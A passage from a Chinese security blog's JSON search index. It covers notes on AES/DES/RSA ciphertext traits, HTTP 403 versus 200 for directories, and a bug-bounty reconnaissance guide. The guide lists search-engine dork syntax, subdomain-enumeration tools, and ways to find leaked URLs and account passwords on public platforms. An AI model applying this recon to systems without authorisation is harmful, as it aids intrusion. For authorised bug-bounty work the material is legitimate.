明文越长密文越长，密文中一般不会出现 &#x2F; 区分大小写 对称加密代表有 AES，常见的还有 DES ， RC4 优点：算法公开，计算量小，加密速度快，加密效率高 缺点：发送方和接收方必须商定好密钥，密钥管理可能存在问题 AES、DES密文特点：和base64基本类似，但密文中一般会有 &#x2F; 和 + 解密需求：密文、模式、加密key，偏移量（ECB模式默认没有偏移量），条件满足方可解密 非对称加密代表有 RSA ，常见的还有 RSA2 ， PKCS 优点：比对称加密安全性更好，加解密需要不同的密钥，即 使用公钥加密就要使用私钥解密，使用私钥加密就要公钥解密 缺点：加解密花费时间长，速度慢，只适合对少量数据进行加密 密文特点：和AES相似，但是长度较长，同一明文每次加密他的密文都会变动 解密需求：密文、公钥或私钥 数据包基础请求 响应 状态码 在请求目录时，比如xxxxx&#x2F;sys&#x2F;admin&#x2F;为200 OK，而xxxxx&#x2F;sys&#x2F;为403，为什么？ 原因是在访问xxxxx&#x2F;sys&#x2F;admin&#x2F;时，此目录下面有类似于index的指引页面，因此可以返回200；而xxxxx&#x2F;sys&#x2F;目录下没有类似于index的指引 页面，因此返回403，但是此目录是存在的，所以扫到目录显示403表示目录是存在的","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://ink-scholar.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"WEB","slug":"WEB","permalink":"https://ink-scholar.github.io/tags/WEB/"},{"name":"基础","slug":"基础","permalink":"https://ink-scholar.github.io/tags/%E5%9F%BA%E7%A1%80/"}]},{"title":"SRC通用讲解","slug":"SRC通用讲解","date":"2023-11-24T13:12:12.413Z","updated":"2023-12-06T15:42:58.179Z","comments":true,"path":"2023/11/24/SRC通用讲解/","permalink":"https://ink-scholar.github.io/2023/11/24/SRC%E9%80%9A%E7%94%A8%E8%AE%B2%E8%A7%A3/","excerpt":"","text":"此篇主要讲解src挖掘过程中的通用技巧，已方法为主，帮助快速刷src，赚点赏金 信息收集网络空间搜索精准搜索域名搜索Fofa：domain&#x3D;“baidu.com” Hunter：domain.suffix&#x3D;”Baidu.com” Google：site:baidu.com 域名解析微步：https://x.threatbook.com/ 360：https://ti.360.cn/ 旁站查询：https://webscan.cc （对于IP站更好一点） 子域名工具水泽：https://github.com/0x727/ShuiZe_0x727 灯塔魔改版：https://github.com/ki9mu/ARL-plus-docker Nemo：https://github.com/hanc00l/nemo_go 推荐灯塔魔改版 企业查询小蓝本、企查查、爱企查、微信小程序、公众号 模糊搜索通用方法Github关键字搜索 网络空间搜索引擎body，title，ico特征，js特征搜索 通用系统搜索 CNVD通用搜索 EDU通用搜索 短视频信息搜索抖音快手B站等，直接搜索内容，如：腾讯后台登录教程，可以看到一些url甚至是账号密码 语雀搜索 语雀搜索是需要登录的，登录后可以进入页面 https://www.yuque.com/dashboard ，左上角会存在搜索 当然登陆客户端也有 弱口令条件竞争（并发）越权CORS➕XSS未授权SSRF➕RCE逻辑漏洞云安全常见框架漏洞","categories":[{"name":"SRC","slug":"SRC","permalink":"https://ink-scholar.github.io/categories/SRC/"}],"tags":[{"name":"src","slug":"src","permalink":"https://ink-scholar.github.io/tags/src/"}]}],"categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://ink-scholar.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"代码审计","slug":"代码审计","permalink":"https://ink-scholar.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"SRC","slug":"SRC","permalink":"https://ink-scholar.github.io/categories/SRC/"}],"tags":[{"name":"信息搜集","slug":"信息搜集","permalink":"https://ink-scholar.github.io/tags/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"},{"name":"WEB","slug":"WEB","permalink":"https://ink-scholar.github.io/tags/WEB/"},{"name":"代码审计","slug":"代码审计","permalink":"https://ink-scholar.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"基础","slug":"基础","permalink":"https://ink-scholar.github.io/tags/%E5%9F%BA%E7%A1%80/"},{"name":"src","slug":"src","permalink":"https://ink-scholar.github.io/tags/src/"}]}